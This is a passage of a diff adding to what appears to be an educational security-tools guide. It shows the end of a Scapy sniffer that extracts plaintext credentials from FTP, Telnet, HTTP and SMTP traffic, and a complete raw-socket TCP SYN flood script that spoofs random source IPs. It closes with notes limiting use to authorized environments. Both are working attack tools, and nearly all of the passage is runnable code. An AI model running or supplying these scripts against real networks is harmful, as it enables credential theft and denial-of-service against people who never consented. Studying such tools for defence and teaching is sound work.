+            (proto == "FTP" and dport == 21) or
+            (proto == "Telnet" and dport == 23) or
+            (proto == "HTTP" and dport in {80, 8080}) or
+            (proto == "SMTP" and dport in {25, 587}) or
+            dport in CRED_PORTS
+        )
+        if not relevant_port:
+            continue
+
+        m = pattern.search(payload)
+        if m:
+            found = m.group(0).decode("utf-8", errors="replace").strip()
+            print(f"\n[!] {desc} detected")
+            print(f"    Direction: {direction}")
+            print(f"    Data: {found[:120]}")
+            print(f"    Raw: {payload[:200]}")
+            break
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Plaintext Protocol Credential Sniffer (requires root)")
+    parser.add_argument("-i", "--interface", default="eth0", help="Network interface (default: eth0)")
+    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to capture (0=unlimited)")
+    parser.add_argument("-f", "--filter", default="tcp", help="BPF filter (default: tcp)")
+    args = parser.parse_args()
+
+    print(f"[*] Sniffing started — Interface: {args.interface}  Filter: {args.filter}")
+    print("[*] Press Ctrl+C to stop\n")
+    try:
+        sniff(
+            iface=args.interface,
+            filter=args.filter,
+            prn=packet_handler,
+            count=args.count,
+            store=False,
+        )
+    except KeyboardInterrupt:
+        print("\n[*] Sniffing stopped")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Example 7-6 / 7-7: TCP SYN Flood — Raw socket SYN packet generation (Python 3.10+, educational purpose)
+```python
+#!/usr/bin/env python3
+"""
+TCP SYN Flood Demo — Educational/defensive understanding only (Python 3.10+)
+DO NOT use for actual attacks. Test only in authorized, isolated environments.
+Usage: sudo python3 syn_flood_demo.py <target_ip> <target_port> [--count 10]
+"""
+from __future__ import annotations
+import argparse
+import random
+import socket
+import struct
+import sys
+
+
+def _checksum(data: bytes) -> int:
+    """Calculate internet checksum."""
+    s = 0
+    n = len(data)
+    for i in range(0, n - 1, 2):
+        s += (data[i] << 8) + data[i + 1]
+    if n % 2:
+        s += data[-1] << 8
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    return ~s & 0xFFFF
+
+
+def _build_ip_header(src_ip: str, dst_ip: str) -> bytes:
+    src = socket.inet_aton(src_ip)
+    dst = socket.inet_aton(dst_ip)
+    hdr = struct.pack(
+        "!BBHHHBBH4s4s",
+        0x45, 0,       # version/IHL, TOS
+        40,            # total length (IP + TCP)
+        random.randint(0, 0xFFFF),  # ID
+        0,             # flags + offset
+        64,            # TTL
+        socket.IPPROTO_TCP,
+        0,             # checksum (kernel fills)
+        src, dst,
+    )
+    return hdr
+
+
+def _build_tcp_syn(src_port: int, dst_port: int, src_ip: str, dst_ip: str) -> bytes:
+    seq = random.randint(0, 0xFFFFFFFF)
+    tcp_hdr = struct.pack(
+        "!HHLLBBHHH",
+        src_port, dst_port,
+        seq, 0,
+        0x50,   # data offset = 5 words
+        0x02,   # SYN flag
+        socket.htons(65535),
+        0,      # checksum placeholder
+        0,
+    )
+    # Pseudo header for checksum
+    pseudo = struct.pack(
+        "!4s4sBBH",
+        socket.inet_aton(src_ip),
+        socket.inet_aton(dst_ip),
+        0,
+        socket.IPPROTO_TCP,
+        len(tcp_hdr),
+    )
+    chk = _checksum(pseudo + tcp_hdr)
+    return struct.pack(
+        "!HHLLBBHHH",
+        src_port, dst_port,
+        seq, 0,
+        0x50, 0x02,
+        socket.htons(65535),
+        chk,
+        0,
+    )
+
+
+def syn_flood(dst_ip: str, dst_port: int, count: int = 10) -> None:
+    """SYN Flood demonstration (use only in authorized, isolated environments)."""
+    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    print(f"[*] SYN Flood demo: {dst_ip}:{dst_port} x {count} packets")
+
+    for i in range(count):
+        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        ip_hdr = _build_ip_header(src_ip, dst_ip)
+        tcp_hdr = _build_tcp_syn(src_port, dst_port, src_ip, dst_ip)
+        raw.sendto(ip_hdr + tcp_hdr, (dst_ip, 0))
+        print(f"  [{i+1:>4}] {src_ip}:{src_port} → {dst_ip}:{dst_port}")
+
+    raw.close()
+    print("[*] Done")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="TCP SYN Flood Demo (educational purpose, authorized environments only)"
+    )
+    parser.add_argument("target_ip", help="Target IP address")
+    parser.add_argument("target_port", type=int, help="Target port")
+    parser.add_argument("--count", type=int, default=10, help="Number of SYN packets to send (default: 10)")
+    args = parser.parse_args()
+
+    if args.count > 1000:
+        print("[!] Capped at 1000 packets for safety.", file=sys.stderr)
+        args.count = 1000
+
+    syn_flood(args.target_ip, args.target_port, args.count)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## 10. Tool Execution Notes
+
+```
+WARNING: All tools must only be used in authorized environments!
+    - CTF challenges
+    - Systems you own
+    - Contracted penetration testing targets
+
+Required packages:
+pip install scapy paramiko requests dnspython python-whois
+
+Scapy requires root/administrator privileges:
 sudo python3 scanner.py 192.168.1.0/24
 ```
